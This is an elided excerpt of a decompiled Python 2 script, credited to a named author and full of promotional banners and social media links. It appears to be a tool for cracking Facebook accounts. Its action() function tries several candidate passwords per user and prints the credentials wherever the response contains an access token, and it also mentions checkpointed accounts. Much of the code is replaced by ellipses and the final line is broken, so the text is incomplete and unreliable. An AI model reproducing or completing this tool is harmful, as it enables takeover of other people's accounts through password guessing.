...
# Decompiled By Mainul Islam 

# Facebook  : https://www.facebook.com/its.mainul.ok.tata.good.bye

# uncompyle6 version 

# Original written By Mainul Islam 

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'Mainul'

__copyright = 'All rights reserved . Copyright  Mainul Islam'

CorrectUsername = 'Mainul'
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            os.system('xdg-open https://www.facebook.com/its.mainul.ok.tata.good.bye')
...
Subscribe Tpo YouTube Channel and My Follow Facebook <::::::::::::::::[]

 ______________________________________________

 Author   :            Mainul Islam 

 Facebook :          Md. Zalal Uddin

 Youtube   :        MD. Mainul Islam 
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  Boss-Ok  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  Boss-Ok ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  Boss-Ok ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  Boss-Ok  ' + k + c + user + '  |  ' + pass3
    ...
    jalan('Note : Cp account  10 say 12 days OPEN)
